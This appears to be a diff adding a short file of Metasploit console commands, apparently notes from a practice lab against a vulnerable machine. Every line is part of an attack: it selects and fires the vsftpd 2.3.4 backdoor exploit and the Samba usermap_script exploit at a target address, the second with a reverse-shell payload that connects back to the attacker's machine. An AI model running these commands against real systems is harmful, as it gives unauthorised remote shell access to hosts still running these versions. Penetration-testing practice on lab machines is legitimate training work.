@@ -1,0 +1,28 @@
+
+ip addr
+ifconfig
+
+msfconsole
+search vsftpd
+use exploit/unix/ftp/vsftpd_234_backdoor
+info
+set RHOST 192.168.227.150
+show payloads
+set payload cmd/unix/interact
+exploit
+ls
+
+# Search Samba
+search samba
+search 3.0.20
+
+# Select Samba module
+use exploit/multi/samba/usermap_script
+info
+set RHOST 192.168.227.150
+info
+set LHOST <KALI_LINUX_IP>
+show payloads
+set payload cmd/unix/reverse
+exploit
+ls
